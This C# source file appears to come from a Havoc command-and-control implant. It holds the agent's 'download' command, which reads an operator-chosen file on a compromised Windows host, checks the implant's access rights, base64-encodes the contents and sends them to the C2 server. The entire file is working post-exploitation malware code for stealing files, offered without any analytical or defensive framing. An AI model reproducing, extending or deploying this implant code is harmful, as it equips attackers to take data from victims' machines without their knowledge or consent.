using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using HavocImplant.Communications;

namespace HavocImplant.AgentFunctions
{
    public class Download
    {
        public static void Run(Implant agent, string args, int taskId)
        {
            bool isRelativePath = false;
            string downloadLocation = args.Substring(12);

            if (downloadLocation.EndsWith("\\") || string.IsNullOrEmpty(downloadLocation))
            {
                agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\n Please include the file name in the path to download").Replace("\\", "\\\\"));
                return;
            }

            if (!downloadLocation.StartsWith("\\") && !Regex.Match(downloadLocation.ToLower(), @"^\D:\\").Success) isRelativePath = true;
            string dir = parseDirectory(downloadLocation, isRelativePath);

            downloadLocation = Path.GetFullPath(Path.Combine(new string[] { dir, downloadLocation }));

            Console.WriteLine($"File to download is {downloadLocation}");

            if (File.Exists(downloadLocation))
            {
                if (checkReadAccess(downloadLocation))
                {
                    byte[] fileBytes = File.ReadAllBytes(downloadLocation);
                    string base64Bytes = Convert.ToBase64String(fileBytes);
                    Dictionary<string, string> FileData = new Dictionary<string, string>();
                    FileData.Add("FileSize", fileBytes.Length.ToString());
                    FileData.Add("FileName", Regex.Replace(downloadLocation, @"\r\n?|\n|\n\r", "\\n").Replace("\\", "\\\\\\\\"));
                    FileData.Add("FileContent", Regex.Replace(base64Bytes, @"\r\n?|\n|\n\r", "\\n"));
                    string postData = Utils.DictionaryToJson(FileData);
                    //string jsonString = "{\"FileSize\": \"{1}\", \"FileName\": \"{0}\", \"FileContent\": \"{2}\"".Replace("{1}", fileBytes.Length.ToString()).Replace("{0}", Regex.Replace(downloadLocation, @"\r\n?|\n|\n\r", "\\n").Replace("{2}", Regex.Replace(base64Bytes, @"\r\n?|\n|\n\r", "\\n")));
                    Comms.CheckIn(agent, postData, "download");
                    agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\nSuccessfully downloaded {downloadLocation} with {fileBytes.Length} bytes").Replace("\\", "\\\\"));
                    return;
                }
                else
                {
                    agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\nCould not download {downloadLocation} due to lack of permissions").Replace("\\", "\\\\"));
                    return;
                }
            }
            else
            {
                agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\n{downloadLocation} does not exist").Replace("\\", "\\\\"));
                return;
            }
        }
        public static bool checkReadAccess(string dir)
        {
            string DirectoryPath = dir;
            FileSystemRights AccessRight = FileSystemRights.CreateFiles | FileSystemRights.WriteData;


            AuthorizationRuleCollection rules = Directory.GetAccessControl(DirectoryPath).GetAccessRules(true, true, typeof(System.Security.Principal.SecurityIdentifier));
            WindowsIdentity identity = WindowsIdentity.GetCurrent();

            foreach (FileSystemAccessRule rule in rules)
            {
                if (identity.Groups.Contains(rule.IdentityReference))
                {
                    if ((AccessRight & rule.FileSystemRights) == AccessRight && (rule.FileSystemRights & FileSystemRights.ReadData) > 0)
                    {
                        if (rule.AccessControlType == AccessControlType.Allow)
                            return true;
                    }
                }
            }
            return false;
        }
        public static string parseDirectory(string dir, bool isRelativePath)
        {
            dir = dir.Replace("\"", "");
            string retVal = "";
            if (!isRelativePath)
            {
                var tmp = Regex.Split(dir, @"(?<=[\\])").ToList<string>();
                tmp.RemoveAt(tmp.Count - 1);
                dir = Path.GetFullPath(Path.Combine(new string[] { String.Concat(tmp.ToArray<string>()) }));
            }
            else
                dir = Path.GetFullPath(Directory.GetCurrentDirectory());
            return dir;
        }
    }
}
